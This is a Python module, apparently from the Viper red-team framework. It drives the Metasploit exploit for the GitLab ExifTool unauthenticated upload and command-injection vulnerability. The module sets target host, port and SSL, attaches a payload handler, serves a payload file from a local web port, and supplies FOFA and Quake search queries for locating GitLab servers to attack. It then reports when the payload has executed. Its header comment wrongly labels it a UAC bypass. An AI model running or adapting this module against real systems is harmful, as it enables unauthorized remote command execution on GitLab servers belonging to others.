# -*- coding: utf-8 -*-
# @File  : PostMulitMsfBypassUAC.py
# @Date  : 2019/3/15
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(BotMSFModule):
    NAME_ZH = "Gitlab ExifTool RCE"
    DESC_ZH = "此模块利用GitLab Community Edition（CE）和Enterprise Edition（EE）中未经验证的文件上载和命令注入漏洞进行攻击.\n" \
              "补丁版本为13.10.3、13.9.6和13.8.8.利用此漏洞将导致以git用户身份执行命令.\n" \
              "建议linux类型payload"

    NAME_EN = "Gitlab ExifTool RCE"
    DESC_EN = "This module exploits an unauthenticated file upload and command injection vulnerability in GitLab Community Edition (CE) and Enterprise Edition (EE).\n" \
              "The patched versions are 13.10.3, 13.9.6, and 13.8.8. Exploitation will result in command execution as the git user."
    MODULETYPE = TAG2TYPE.Bot_MSF_Exp
    README = ["https://www.yuque.com/vipersec/module/klnhmx"]
    REFERENCES = [""]
    AUTHOR = ["Viper"]
    SEARCH = {
        "FOFA": 'app:"gitlab"',
        "Quake": 'app:"gitlab"',
    }
    OPTIONS = register_options([
        OptionHander(),
        OptionInt(name='SRVPORT',
                  tag_zh="SRVPORT", desc_zh="Host载荷文件的web服务端口",
                  tag_en="SRVPORT", desc_en="Webserver port used to host payload file",
                  default=8080),
    ])

    def __init__(self, ip, port, protocol, custom_param):
        super().__init__(ip, port, protocol, custom_param)
        self.type = "exploit"
        self.mname = "multi/http/gitlab_exif_rce"

    def check(self):
        """执行前的检查函数"""
        result = self.set_payload_by_handler()
        if result is not True:
            return False, "无法解析Handler,请选择正确的监听", "Unable to resolve Handler, please select the correct handler"
        else:
            if self._port == 443:
                self.set_msf_option("SSL", True)
            else:
                self.set_msf_option("SSL", False)
            self.set_msf_option("RHOSTS", self._ip)
            self.set_msf_option("RPORT", self._port)
            self.set_msf_option("SRVPORT", self.param("SRVPORT"))
            self.set_msf_option("TARGET", 1)
            return True, ""

    def callback(self, module_output):
        # 调用父类函数存储结果(必须调用)
        if "The target is vulnerable." in module_output:
            self.log_good("检测到网站存在Gitlab ExifTool RCE漏洞,执行payload",
                          "A Gitlab ExifTool RCE was detected on the website, and the payload was executed")
            return True
        else:
            self.log_error("网站不存在漏洞", "The website does not have vulnerabilities")
            return False
